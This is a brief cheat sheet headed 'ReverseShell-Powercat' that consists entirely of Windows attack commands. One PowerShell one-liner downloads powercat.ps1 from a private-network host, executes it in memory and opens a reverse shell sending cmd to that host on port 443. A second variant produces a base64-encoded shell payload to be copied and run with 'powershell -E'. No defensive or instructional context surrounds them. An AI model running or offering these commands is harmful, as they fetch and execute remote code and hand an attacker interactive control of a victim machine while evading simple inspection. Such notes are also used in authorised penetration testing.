## ReverseShell-Powercat

Reverse shell

	powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.46.2/powercat.ps1');powercat -c 192.168.46.2 -p 443 -e cmd"

Encoded shell

	powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.46.2/powercat.ps1');powercat -c 192.168.1.3 -p 443 -e cmd.exe -ge > encodedshell.ps1
	
	cat encodedshell.ps1 | clip
	
	powershell -E <PASTE>